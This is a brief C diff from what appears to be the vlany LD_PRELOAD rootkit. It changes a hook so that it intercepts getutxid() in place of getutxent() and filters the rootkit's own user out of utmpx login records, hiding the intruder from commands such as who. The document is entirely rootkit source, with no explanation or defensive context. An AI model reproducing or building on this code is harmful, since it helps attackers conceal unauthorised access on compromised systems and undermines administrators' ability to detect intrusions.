@@ -1,12 +1,12 @@
-struct utmpx *getutxent(void)
+struct utmpx *getutxid(const struct utmpx *utx)
 {
     #ifdef DEBUG
-        printf("[vlany] getutxent() called\n");
+        printf("[vlany] getutxid() called\n");
     #endif
 
-    HOOK(old_getutxent, CGETUTXENT);
+    HOOK(old_getutxid, CGETUTXID);
 
-    struct utmpx *tmp = old_getutxent();
+    struct utmpx *tmp = old_getutxid(utx);
 
     if(tmp && tmp->ut_user != NULL)
     {
@@ -15,5 +15,5 @@ struct utmpx *getutxent(void)
         CLEAN(vlany_user);
     }
 
-    return old_getutxent();
+    return old_getutxid(utx);
 }
